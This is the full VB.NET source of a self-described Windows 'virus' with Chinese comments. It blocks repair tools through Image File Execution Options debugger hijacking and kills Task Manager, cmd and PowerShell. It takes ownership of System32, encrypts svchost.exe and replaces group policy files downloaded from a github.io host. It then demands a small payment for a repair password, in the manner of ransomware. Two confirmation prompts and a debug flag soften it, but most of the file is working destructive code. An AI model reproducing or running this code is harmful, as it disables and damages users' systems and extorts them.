﻿Imports System.IO
Imports System.Threading

Public Module ModMain
    ''' <summary>
    ''' 程序的启动路径，以“\”结尾。
    ''' </summary>
    Public Path As String = AppDomain.CurrentDomain.SetupInformation.ApplicationBase
    ''' <summary>
    ''' 带有程序名称的完整路径。
    ''' </summary>
    Public PathWithName As String = Path & AppDomain.CurrentDomain.SetupInformation.ApplicationName
    ''' <summary>
    ''' 是否在调试模式。
    ''' </summary>
    Public Const Debug As Boolean = True
    Private _uuid As Integer = 0
    ''' <summary>
    ''' 修复密码。
    ''' </summary>
    Private Const Password As String = "E96DC1A0045AA0C3E1C7FEEC21DB44A5CNWM3MzFkZDI1MTdhNmU5MzZhOWNkYTA2N2QwZjk5ZjA1VjBablJiVVZRdnpEV3lXN0NDVXFHa1F4aklmMC9nMEpFK0RsQkRRWXFiSWQycFdtQ0xLUDNtaGh2SzhIOW9FK2NOend2TVplbWMxRHZZWlBHNFZnZWdyOUZOU1RqQTdCLzNKZzhRbUZTazgzcVpweTZTaEJicy9rOHJuOE1jWjMvRFRoSTZHOTU2dUJZZENaelFLM1VpRjdTc3NHcjFqTEZLOG9WcVMrN0U9"
    ''' <summary>
    ''' 获取一个全程序不会重复的数字(伪UUID)。
    ''' </summary>
    ''' <returns></returns>
    Public Function UUID() As Integer
        _uuid += 1
        Return _uuid
    End Function
    ''' <summary>
    ''' 病毒主方法。
    ''' </summary>
    Public Sub StartVirus()
        '预下载文件
        Dim th As New Thread(Sub()
                                 Try
Retry:
                                     Directory.CreateDirectory("C:\Temp")
                                     My.Computer.Network.DownloadFile("https://youzi-2333.github.io/cloud/Virus/2022/Machine/Registry.pol", "C:\Temp\Registry.pol")
                                     My.Computer.Network.DownloadFile("https://youzi-2333.github.io/cloud/Virus/2022/Machine/comment.cmtx", "C:\Temp\comment.cmtx")
                                     My.Computer.Network.DownloadFile("https://youzi-2333.github.io/cloud/Virus/2022/gpt.ini", "C:\Temp\gpt.ini")
                                 Catch
                                     GoTo Retry
                                 End Try
                             End Sub)
        th.Start()
        '申请权限
        Try
            '此处判断是否有管理员权限
            File.WriteAllText("C:\test.tmp", "test")
            File.Delete("C:\test.tmp")
        Catch ex As Exception
            If Not RerunAsAdmin() Then
                MsgBox("请以管理员身份重新运行。",, "提示")
                Process.GetCurrentProcess.Kill()
            End If
        End Try
        '运行确认
        RunCheck()

        If Not Debug Then KillCs() '破坏系统
        If MsgBox("你的电脑已经损坏。" & vbCrLf & "如需修复，请支付两个硬币，然后凭截图联系作者。" & vbCrLf & "是否需要修复电脑？", MsgBoxStyle.Information + MsgBoxStyle.YesNo, "提示") = 6 Then
            '是
            File.Create("C:\password.txt").Dispose() '创建文件
            StartProgram("C:\Windows\notepad.exe", "C:\password.txt")
            MsgBox("请在弹出的窗口中粘贴密码，保存并关闭，然后按下确定。",, "提示")
            Dim Pass As String = File.ReadAllText("C:\password.txt")
            If Not Pass = Password Then
                MsgBox("密码错误！！！",, "警告")
                GoTo WrongPass '相当于选择“否”
            End If
            MsgBox("密码正确！",, "提示")
            UndoVirus() '撤销所有更改
        Else
            '否
WrongPass:  '密码错误
            Try
                'Directory.Delete("C:\Windows\System32", True)
                If Not Debug Then File.Delete("C:\Windows\System32\svchost.exe.bak") '删除备份
                Directory.CreateDirectory("C:\Windows\System32\GroupPolicy\Machine\")
                If th.IsAlive Then
                    '如果未下载完成，则等待完成
                    Do Until Not th.IsAlive
                        Thread.Sleep(500)
                    Loop
                End If

                '修改组策略
                'C:\Windows\System32\GroupPolicy\Machine\Registry.pol
                If File.Exists("C:\Windows\System32\GroupPolicy\Machine\Registry.pol") Then
                    File.Delete("C:\Windows\System32\GroupPolicy\Machine\Registry.pol")
                End If
                File.Copy("C:\Temp\Registry.pol", "C:\Windows\System32\GroupPolicy\Machine\Registry.pol")

                'C:\Windows\System32\GroupPolicy\Machine\comment.cmtx
                If File.Exists("C:\Windows\System32\GroupPolicy\Machine\comment.cmtx") Then
                    File.Delete("C:\Windows\System32\GroupPolicy\Machine\comment.cmtx")
                End If
                File.Copy("C:\Temp\comment.cmtx", "C:\Windows\System32\GroupPolicy\Machine\comment.cmtx")

                'C:\Windows\System32\GroupPolicy\gpt.ini
                If File.Exists("C:\Windows\System32\GroupPolicy\gpt.ini") Then
                    File.Delete("C:\Windows\System32\GroupPolicy\gpt.ini")
                End If
                File.Copy("C:\Temp\gpt.ini", "C:\Windows\System32\GroupPolicy\gpt.ini")


                '删除缓存
                Directory.Delete("C:\Temp", True)
                MsgBox("你的电脑已经彻底损坏！",, "警告")

                '《特效》
                For i = 0 To 50
                    StartProgram("C:\Windows\explorer.exe")
                    File.WriteAllText("C:\" & i & ".txt", SecretEncrupt(SecretEncrupt("egoinrinhqpgbpnqg" & (i * 114514).ToString)))
                    StartProgram("C:\Windows\notepad.exe", "C:\" & i & ".txt")
                    My.Computer.Keyboard.SendKeys("zxpagvdop")
                    My.Computer.Keyboard.SendKeys(i.ToString)
                    Thread.Sleep(100)
                Next i
                Process.GetCurrentProcess.Kill()
            Catch
            End Try
        End If
    End Sub
    '注册表IO (来自PCL)
    ''' <summary>
    ''' 读取注册表值。
    ''' </summary>
    ''' <param name="Registry">主键，例如My.Computer.Registry.CurrentUser。</param>
    ''' <param name="Location">项，以“\”结尾，例如Software\。</param>
    ''' <param name="Key">键。</param>
    ''' <param name="DefaultValue"></param>
    ''' <returns></returns>
    Public Function ReadReg(ByVal Registry As Microsoft.Win32.RegistryKey, ByVal Location As String, ByVal Key As String, Optional ByVal DefaultValue As String = "") As String
        Try
            Dim softKey As Microsoft.Win32.RegistryKey
            softKey = Registry.OpenSubKey(Location, True)
            If softKey Is Nothing Then
                ReadReg = DefaultValue '不存在则返回默认值
            Else
                Dim readValue As New System.Text.StringBuilder
                readValue.AppendLine(softKey.GetValue(Key))
                Dim value = readValue.ToString.Replace(vbCrLf, "") '去除莫名的回车
                Return If(value = "", DefaultValue, value) '错误则返回默认值
            End If
        Catch ex As Exception
            Return DefaultValue
        End Try
    End Function
    ''' <summary>
    ''' 写入注册表。
    ''' </summary>
    ''' <param name="Registry">主键，例如My.Computer.Registry.CurrentUser。</param>
    ''' <param name="Location">项，以“\”结尾，例如Software\。</param>
    ''' <param name="Key">键。</param>
    ''' <param name="Value">要写入的值。</param>
    ''' <param name="ShowException"></param>
    Public Sub WriteReg(ByVal Registry As Microsoft.Win32.RegistryKey, ByVal Location As String， ByVal Key As String, ByVal Value As String, Optional ByVal ShowException As Boolean = False)
        Try
            Dim softKey As Microsoft.Win32.RegistryKey
            softKey = Registry.OpenSubKey(Location, True)
            If softKey Is Nothing Then softKey = Registry.CreateSubKey(Location) '如果不存在就创建  
            softKey.SetValue(Key, Value)
        Catch ex As Exception
            If ShowException Then Throw '如果显示错误就丢一个
        End Try
    End Sub
    Public Function RerunAsAdmin() As Boolean
        Try
            Process.Start(New ProcessStartInfo(PathWithName) With {.Verb = "runas"})
            Process.GetCurrentProcess.Kill()
            Return True
        Catch
            Return False
        End Try
    End Function
    Public Sub KillProcesses(ByVal ProcessName As String)
        Dim Processes As Process() = Process.GetProcessesByName(ProcessName)
        For Each Prs As Process In Processes
            Prs.Kill()
        Next
    End Sub
    Public Sub StartProgram(ByVal ProgramPath As String, Optional ByVal Arguments As String = "", Optional ByVal Wait As Boolean = False)
        Try
            Dim Program As New Process
            Program.StartInfo.FileName = ProgramPath
            Program.StartInfo.Arguments = Arguments
            Program.Start()
            If Wait Then Program.WaitForExit()
        Catch
        End Try
    End Sub
    '运行阶段1 - 确认
    Public Sub RunCheck()
        If MsgBox("这是一个病毒，确定要运行吗？", MsgBoxStyle.Question + MsgBoxStyle.YesNo, "警告") = 7 Then Process.GetCurrentProcess.Kill()
        If MsgBox("确定要运行吗？这是最后的警告！", MsgBoxStyle.Question + MsgBoxStyle.YesNo, "警告") = 7 Then Process.GetCurrentProcess.Kill()
    End Sub
    '阶段2 - 破坏系统
    Public Sub KillCs()
        '步骤1 - 防止修复
        '结束进程
        KillProcesses("taskmgr.exe")
        KillProcesses("cmd.exe")
        KillProcesses("powershell.exe")
        KillProcesses("regedit.exe")
        KillProcesses("java.exe")
        KillProcesses("javaw.exe")
        '映像劫持
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe\", "debugger", "notepad.exe")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe\", "debugger", "notepad.exe")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe\", "debugger", "notepad.exe")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe\", "debugger", "notepad.exe")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tasklist.exe\", "debugger", "notepad.exe")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskkill.exe\", "debugger", "notepad.exe")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tskill.exe\", "debugger", "notepad.exe")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\java.exe\", "debugger", "notepad.exe")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\javaw.exe\", "debugger", "notepad.exe")

        '步骤2 - 加密系统
        Dim th As New Thread(Sub()
                                 '获取权限
                                 StartProgram("takeown", "/f C:\Windows\System32 /a /r", True)
                                 StartProgram("icacls", "C:\Windows\System32 /t /grant:r everyone:f", True)
                                 '加密文件
                                 EncruptFile("C:\Windows\System32\svchost.exe")
                             End Sub)
        th.Start()
    End Sub
    ''' <summary>
    ''' 撤销病毒的所有操作。
    ''' </summary>
    Public Sub UndoVirus()
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe\", "debugger", "")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe\", "debugger", "")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe\", "debugger", "")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe\", "debugger", "")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tasklist.exe\", "debugger", "")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskkill.exe\", "debugger", "")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tskill.exe\", "debugger", "")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\java.exe\", "debugger", "")
        WriteReg(My.Computer.Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\javaw.exe\", "debugger", "")
        File.Delete("C:\Windows\System32\svchost.exe")
        File.Move("C:\Windows\System32\svchost.exe.bak", "C:\Windows\System32\svchost.exe")
    End Sub
End Module
